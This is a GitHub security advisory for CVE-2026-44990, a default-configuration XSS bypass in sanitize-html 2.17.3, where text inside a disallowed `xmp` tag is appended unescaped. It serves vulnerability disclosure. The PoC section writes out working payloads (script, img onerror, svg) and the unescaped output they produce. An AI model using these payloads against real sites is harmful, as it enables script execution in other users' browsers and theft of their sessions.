# [C] Apostrophe has default XSS via `xmp` raw-text passthrough in `sanitize-html`

## Summary
Severity: Critical
Advisory: GHSA-rpr9-rxv7-x643
CVE: CVE-2026-44990
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-rpr9-rxv7-x643
Type: github-advisory

## Affected
- npm: `sanitize-html` — affected >=2.17.3 <2.17.4

## Details
### Summary
Under the default configuration, `sanitize-html` can turn attacker-controlled content inside a disallowed `xmp` element into live HTML or JavaScript. This is a sanitizer bypass in the default `disallowedTagsMode: 'discard'` path and can lead to stored XSS in applications that render sanitized output back to users.

### Details
In `sanitize-html@2.17.3`, the default `nonTextTags` list includes only `script`, `style`, `textarea`, and `option` in `index.js` lines 138-142. That means disallowed `xmp` tags are not treated as "drop the entire contents" tags.

Later, in the `ontext` handler at `index.js` lines 569-577, the code special-cases `textarea` and `xmp` and appends their text content directly to the output without escaping:

```js
} else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') && (tag === 'textarea' || tag === 'xmp')) {
  result += text;
}
```

Because `htmlparser2` treats `xmp` as a raw-text element, markup inside `xmp` is parsed as text on input but becomes live markup again once it is appended unescaped to the sanitized output.

This creates a default sanitizer bypass. For example, a disallowed `<xmp>` wrapper can be used to smuggle `<script>` or event-handler payloads through sanitization.

The README also appears to contradict the implementation. In the "Discarding the entire contents of a disallowed tag" section, the documented exception list names only `style`, `script`, `textarea`, and `option`, and does not mention `xmp`.

### PoC
Tested locally against `sanitize-html@2.17.3` on Node.js `v25.2.1`.

1. Install the package:

```bash
npm install sanitize-html
```

2. Run the following script:

```js
const sanitizeHtml = require('sanitize-html');

console.log(sanitizeHtml('<xmp><script>alert(1)</script></xmp>'));
console.log(sanitizeHtml('<xmp><img src=x onerror=alert(1)></xmp>'));
console.log(sanitizeHtml('<xmp><svg><script>alert(1)</script></svg></xmp>'));
```

3. Observed output:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg><script>alert(1)</script></svg>
```

4. Render any of the returned strings in a browser context that trusts `sanitize-html` output, for example:

```js
const dirty = '<xmp><script>alert(1)</script></xmp>';
const clean = sanitizeHtml(dirty);
```

If `clean` is inserted into the DOM or stored and later rendered as trusted HTML, the attacker-controlled script executes.

### Impact
This is a cross-site scripting vulnerability in the default sanitizer behavior. Any application that uses `sanitize-html` defaults and then renders the returned HTML as trusted output is impacted. A remote attacker who can submit HTML content can trigger execution of arbitrary JavaScript in another user's browser when that content is viewed.

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rpr9-rxv7-x643
- https://nvd.nist.gov/vuln/detail/CVE-2026-44990
- https://github.com/apostrophecms/apostrophe/issues/5418
- https://github.com/apostrophecms/apostrophe/commit/8d4c882b4ed3a7ce802cd87f89f0c1cb7482b8c2
- https://github.com/apostrophecms/apostrophe
